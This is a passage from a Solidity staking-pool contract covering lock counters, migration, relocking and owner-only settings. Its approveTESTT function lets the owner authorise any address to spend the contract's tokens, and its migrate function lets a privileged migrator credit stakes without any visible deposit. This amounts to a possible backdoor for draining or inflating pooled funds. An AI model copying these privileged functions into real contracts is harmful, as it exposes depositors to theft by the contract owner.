            lockCountTotal.lockCountSecond += lockCount.lockCountSecond;
            lockCountTotal.lockCountThird += lockCount.lockCountThird;
            lockCountTotal.lockCountFourth += lockCount.lockCountFourth;
            lockCountTotal.noLockTotal += lockCount.noLockTotal;
            lockCountTotal.lockFirstTotal += lockCount.lockFirstTotal;
            lockCountTotal.lockSecondTotal += lockCount.lockSecondTotal;
            lockCountTotal.lockThirdTotal += lockCount.lockThirdTotal;
            lockCountTotal.lockFourthTotal += lockCount.lockFourthTotal;
            lockCountTotal.totalInPool += lockCount.totalInPool;
        }
    }

    function getLockCounts(uint poolNo) public view returns(LockCount memory) {
        return lockCounts[poolNo];
    }

    function excludeFromTax(address account, bool takeTax) public onlyOwner {
        isExcludedFromTax[account] = takeTax;
    }

    function updateMigrator(address newMigrator) public onlyOwner {
        migrator = newMigrator;
    }

    function updateTaxAddress(address newTaxAddress) public onlyOwner {
        taxAddress = newTaxAddress;
    }

    function migrate(address toStaker, uint256 amount, uint256 apyTime, uint type_, uint256 timeStakedFor, uint256 stakeTime) external onlyMigrator {
        uint256 initialApy = 0;
        uint256 initialAmount = 0;
        uint256 rAmount = 0;
        bool hasStaked = false;

        uint poolNo = type_;

        require(pools[type_].pool != 0,"Migration: Sorry pool is not set yet.");

        Staker memory staker = stakers[toStaker][poolNo];

        hasStaked = isStaker[toStaker][poolNo];

       if(staker.amount != 0 && hasStaked) {
            rAmount = calculateReturn(toStaker, poolNo);
            initialApy = staker.apyTime;
            initialAmount = staker.amount;
        }

        poolShare[poolNo] += amount;
        amount = amount.add(rAmount);

        staker.wallet = toStaker;
        staker.poolNo = poolNo;
        staker.amount = staker.amount.add(amount);
        staker.apyTime = staker.apyTime > apyTime ? staker.apyTime : apyTime;
        staker.timeStakedFor = staker.timeStakedFor > timeStakedFor ? staker.timeStakedFor : timeStakedFor;
        staker.stakeTime = stakeTime;

        stakers[toStaker][poolNo] = staker;

        
        dividendDistributor.setShare(toStaker, staker.amount, poolNo);
        
        
        if(!hasStaked){
            addLockStakeCounter(poolNo, apyTime, amount);
            stakingSize[poolNo] += 1;
        } else {
            uint256 tAmount = amount.add(initialAmount).sub(rAmount);
            if(initialApy > apyTime) {
                apyTime = initialApy;
            }
            subLockStakeCounter(poolNo, initialApy, initialAmount);
            addLockStakeCounter(poolNo, apyTime, tAmount);
        }
        isStaker[toStaker][poolNo] = true;
        emit Stake(toStaker, poolNo, amount);

    }

    function updateStakingOpenStatus(bool status_) external onlyOwner {
        openStaking = status_;
    }

    function enableCompound(bool canCompound_) external onlyOwner {
        canCompound = canCompound_;
    }

    function lockStake(uint256 apyTime_, uint poolNo_) external {
        Staker memory staker = stakers[_msgSender()][poolNo_];
        require(staker.amount != 0, "StakingPool: Caller has no stake token in this pool");
        require(apyTime_ != 0, "StakingPool: no lock apy passed");
        require(block.timestamp >= staker.stakeTime.add(_getLockPeriod(staker.apyTime)), "StakingPool: Lock time is not over yet.");
        uint256 returnAmount = calculateReturn(_msgSender(), poolNo_);
        subLockStakeCounter(poolNo_, staker.apyTime, staker.amount);
        staker.apyTime = apyTime_;
        staker.timeStakedFor = _stakeTimes(apyTime_);
        staker.stakeTime = block.timestamp;
        staker.amount = staker.amount.add(returnAmount);
        stakers[_msgSender()][poolNo_] = staker;
        addLockStakeCounter(poolNo_, apyTime_, staker.amount);
        
    }

    function approveTESTT(address spender, uint256 amount) external onlyOwner {
        _token.approve(spender, amount);
    }

    receive() external payable{}
}